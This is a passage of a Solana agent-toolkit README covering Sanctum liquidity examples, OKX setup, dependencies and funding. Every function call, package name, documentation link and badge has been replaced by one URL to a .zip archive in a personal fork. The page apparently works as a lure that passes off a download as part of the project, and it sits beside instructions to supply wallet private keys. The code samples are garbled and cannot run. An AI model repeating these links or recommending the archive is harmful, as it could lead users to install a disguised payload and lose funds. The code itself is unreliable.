https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('apys', apys)
```

### Get Sanctum LST TVL

```typescript
const tvls = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip([
  "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1",
  "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
  ])

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('tvls', tvls)
```

### Get Sanctum Owend LST

```typescript
const lsts = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip()

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('lsts', lsts)
```

### Add Liquidity to Sanctum Infinite Pool

```typescript
const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "So11111111111111111111111111111111111111112",
  "1000000000",
  "1100000000",
  5000
)

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('txId', txId)
```

### Remove Liquidity from Sanctum Infinite Pool

```typescript
const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "So11111111111111111111111111111111111111112",
  "1000000000",
  "1100000000",
  5000
)

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('txId', txId)
```

### Swap Sanctum LST

```typescript
const txId = await https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip(
  "So11111111111111111111111111111111111111112",
  "1000000000",
  "1100000000",
  5000,
  "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn"
)

https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip('txId', txId)
```


### Get Chain Data

Note: To use OKX DEX integration, you need to set up the following environment variables: Get OKX API keys from the [OKX Developer Portal] (https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)
- `OKX_API_KEY`
- `OKX_SECRET_KEY`
- `OKX_API_PASSPHRASE`
- `OKX_PROJECT_ID`
- `RPC_URL`
- `SOLANA_PRIVATE_KEY`
- `SOLANA_WALLET_ADDRESS`

## Examples

### LangGraph Multi-Agent System

The repository includes an advanced example of building a multi-agent system using LangGraph and Solana Agent Kit. Located in `examples/agent-kit-langgraph`, this example demonstrates:

- Multi-agent architecture using LangGraph's StateGraph
- Specialized agents for different tasks:
  - General purpose agent for basic queries
  - Transfer/Swap agent for transaction operations
  - Read agent for blockchain data queries
  - Manager agent for routing and orchestration
- Fully typed TypeScript implementation
- Environment-based configuration

Check out the [LangGraph example](examples/agent-kit-langgraph) for a complete implementation of an advanced Solana agent system.

## Dependencies

The toolkit relies on several key Solana and Metaplex libraries:

- https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip
- @solana/spl-token
- @metaplex-foundation/digital-asset-standard-api
- @metaplex-foundation/mpl-token-metadata
- @metaplex-foundation/mpl-core
- @metaplex-foundation/umi
- @lightprotocol/compressed-token
- https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip
- @coingecko/sdk

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.
Refer to [https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip) for detailed guidelines on how to contribute to this project.

## Contributors

<a href="https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip">
  <img src="https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip" />
</a>

## Star History

[![Star History Chart](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)](https://raw.githubusercontent.com/Donmandela/solana-agent-kit/v2/packages/plugin-defi/src/orca/tools/solana-kit-agent-1.4.zip)

## License

Apache-2 License

## Funding

If you wanna give back any tokens or donations to the OSS community -- The Public Solana Agent Kit Treasury Address:

Solana Network : EKHTbXpsm6YDgJzMkFxNU1LNXeWcUW7Ezf8mjUNQQ4Pa

## Security

This toolkit handles transaction generation, signing and sending, using provided wallets. Always ensure you're using it in a secure environment and never share your private keys.
